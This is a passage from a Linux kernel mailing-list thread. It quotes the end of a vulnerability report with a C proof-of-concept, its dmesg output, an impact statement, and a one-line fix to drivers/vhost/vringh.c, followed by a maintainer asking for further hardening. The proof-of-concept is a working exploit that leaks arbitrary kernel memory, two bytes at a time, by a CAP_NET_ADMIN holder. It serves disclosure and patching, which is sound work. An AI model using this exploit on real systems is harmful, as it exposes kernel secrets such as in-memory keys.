> >         if (ioctl(vfd, VHOST_SET_VRING_CALL, &cf)) die("set_vring_call"=
);
> >         struct vhost_vring_file kf =3D { .index =3D 0, .fd =3D kickfd }=
;
> >         if (ioctl(vfd, VHOST_SET_VRING_KICK, &kf)) die("set_vring_kick"=
);
> >
> >         struct vhost_vring_state en =3D { .index =3D 0, .num =3D 1 };
> >         if (ioctl(vfd, VHOST_VDPA_SET_VRING_ENABLE, &en)) die("set_vrin=
g_enable");
> >
> >         __u8 status =3D VIRTIO_CONFIG_S_ACKNOWLEDGE | VIRTIO_CONFIG_S_D=
RIVER
> >                     | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRI=
VER_OK;
> >         if (ioctl(vfd, VHOST_VDPA_SET_STATUS, &status)) die("set_status=
 DRIVER_OK");
> >
> >         uint64_t one =3D 1;
> >         if (write(kickfd, &one, sizeof(one)) !=3D sizeof(one)) die("kic=
k write");
> >
> >         unsigned leaked =3D 0; int found =3D 0;
> >         for (int try =3D 0; try < 20 && !found; try++) {
> >                 usleep(100000);
> >                 FILE *d =3D popen("dmesg 2>/dev/null", "r");
> >                 if (d) {
> >                         char l[512];
> >                         while (fgets(l, sizeof(l), d)) {
> >                                 char *p =3D strstr(l, "Guest says index=
");
> >                                 if (p) {
> >                                         unsigned idx =3D 0, numv =3D 0;
> >                                         if (sscanf(p, "Guest says index=
 %u > %u is available",
> >                                                    &idx, &numv) >=3D 1)=
 {
> >                                                 leaked =3D idx; found =
=3D 1;
> >                                                 fprintf(stderr, "[!!] d=
mesg: %s", l);
> >                                                 break;
> >                                         }
> >                                 }
> >                         }
> >                         pclose(d);
> >                 }
> >         }
> >
> >         if (!found) {
> >                 fprintf(stderr, "[!] no vringh_bad leak line in dmesg; =
dumping tail:\n");
> >                 FILE *d =3D popen("dmesg 2>/dev/null | tail -40", "r");
> >                 if (d) { char l[512]; while (fgets(l, sizeof(l), d)) fp=
uts(l, stderr); pclose(d); }
> >                 die("leak not observed (worker may not have run, or use=
_va/mm_bound not set)");
> >         }
> >
> >         fprintf(stderr, "\n=3D=3D=3D RESULT =3D=3D=3D\n");
> >         fprintf(stderr, "leaked kernel u16 @ linux_banner+4 =3D 0x%04x =
(%u)\n", leaked, leaked);
> >         fprintf(stderr, "expected (/proc/version[4,5])     =3D 0x%04x (=
%u)\n", exp, exp);
> >         if (leaked =3D=3D exp) {
> >                 fprintf(stderr, "MATCH: __get_user read 2 bytes at kern=
el addr 0x%lx via vringh.c:1216\n", banner + 4);
> >                 fprintf(stderr, "PROVEN: arbitrary-kernel-address 2-byt=
e read (no access_ok) on unmodified kernel\n");
> >         } else {
> >                 fprintf(stderr, "MISMATCH - investigate\n");
> >         }
> >
> >         status =3D 0; ioctl(vfd, VHOST_VDPA_SET_STATUS, &status);
> >         close(vfd); close(callfd); close(kickfd);
> >         genl_dev_del(fam, "sim0");
> >         return (leaked =3D=3D exp) ? 0 : 2;
> > }
> > ```
> >
> > Captured dmesg from the 7.2.10 run (the disclosed leaked value):
> > ```
> > [    1.882938] vringh:
> > [    1.882944] Guest says index 8312 > 1 is available
> > ```
> >
> > 7. Impact
> > Privileged kernel memory information leak: a CAP_NET_ADMIN controller c=
an
> > read 2 bytes at an arbitrary kernel virtual address per vring kick via
> > __get_user() with no access_ok(), and the value is disclosed to dmesg v=
ia
> > vringh_bad(). The read is repeatable, so the whole kernel address space
> > can be scanned 2 bytes at a time (kernel .text/.data, structure content=
s,
> > in-memory keys). CAP_NET_ADMIN should not grant arbitrary kernel-memory
> > reads. No memory corruption. KASLR does not prevent it (only the addres=
s
> > is randomized, the leaked content is constant). Only the use_va mode is
> > affected (the non-use_va path goes through GUP, which has an equivalent
> > check_range guard).
> >
> > Please let me know if you need more detail.
> > ---
> >  drivers/vhost/vringh.c | 2 +-
> >  1 file changed, 1 insertion(+), 1 deletion(-)
> >
> > diff --git a/drivers/vhost/vringh.c b/drivers/vhost/vringh.c
> > index 9066f9f..b441243 100644
> > --- a/drivers/vhost/vringh.c
> > +++ b/drivers/vhost/vringh.c
> > @@ -1213,7 +1213,7 @@ static inline int getu16_iotlb(const struct vring=
h *vrh,
> >                 return ret;
> >
> >         if (vrh->use_va) {
> > -               ret =3D __get_user(tmp, (__virtio16 __user *)ivec.iov.i=
ovec[0].iov_base);
> > +               ret =3D get_user(tmp, (__virtio16 __user *)ivec.iov.iov=
ec[0].iov_base);
>
> I see two other places to harden:
> * __put_user present in putu16_iotlb
> * The callers of vhost_iotlb_add_range if vringh->use_va (adding access_o=
k).
>
> Can you send a patch for these two?
>
> Thanks!
>
>
> >                 if (ret)
> >                         return ret;
> >         } else {
> > --
> > 2.43.0
> >
> >

